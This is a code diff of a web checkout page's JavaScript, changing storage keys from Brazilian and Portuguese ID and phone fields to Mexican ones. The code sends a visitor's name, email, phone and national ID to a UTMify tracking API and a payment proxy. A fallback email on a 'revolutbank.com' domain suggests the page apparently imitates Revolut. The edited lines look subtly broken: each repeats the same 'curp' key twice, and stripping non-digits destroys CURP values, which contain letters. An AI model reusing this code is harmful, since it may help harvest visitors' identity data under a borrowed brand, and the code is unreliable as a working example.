@@ -1071,7 +1071,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
       }
 
-      const cpf = localStorage.getItem('nif') || localStorage.getItem('cpf');
+      const cpf = localStorage.getItem('curp') || localStorage.getItem('curp');
       if (cpf) {
         const cpfLimpo = cpf.replace(/\D/g, '');
         if (cpfLimpo.length >= 9) {
@@ -1159,8 +1159,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     async function sendUtmify(status, orderId, createdAt, approvedDate) {
       const nome  = localStorage.getItem('nome') || 'Customer';
       const email = localStorage.getItem('email') || 'customer@revolutbank.com';
-      const phone = (localStorage.getItem('telefone') || localStorage.getItem('telephone') || localStorage.getItem('phone') || '').replace(/\D/g,'');
-      const doc   = (localStorage.getItem('nif') || localStorage.getItem('cpf') || '').replace(/\D/g,'') || null;
+      const phone = (localStorage.getItem('telefono') || localStorage.getItem('telephone') || localStorage.getItem('phone') || '').replace(/\D/g,'');
+      const doc   = (localStorage.getItem('curp') || localStorage.getItem('curp') || '').replace(/\D/g,'') || null;
 
       try {
         await fetch(apiUrl(UTMIFY_API), {
@@ -1244,10 +1244,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       btn.disabled = true;
       label.textContent = 'Procesando…';
 
-      const phone = (localStorage.getItem('telephone') || localStorage.getItem('telefone') || localStorage.getItem('phone') || '').replace(/\D/g,'');
+      const phone = (localStorage.getItem('telephone') || localStorage.getItem('telefono') || localStorage.getItem('phone') || '').replace(/\D/g,'');
       const name  = localStorage.getItem('nome') || localStorage.getItem('name') || 'Customer';
       const email = localStorage.getItem('email') || 'customer@revolutbank.com';
-      const doc   = (localStorage.getItem('nif') || localStorage.getItem('cpf') || '999999999').replace(/\D/g,'') || '999999999';
+      const doc   = (localStorage.getItem('curp') || localStorage.getItem('curp') || '999999999').replace(/\D/g,'') || '999999999';
 
       try {
         const res = await fetch(apiUrl('/api/payment-proxy?action=create'), {
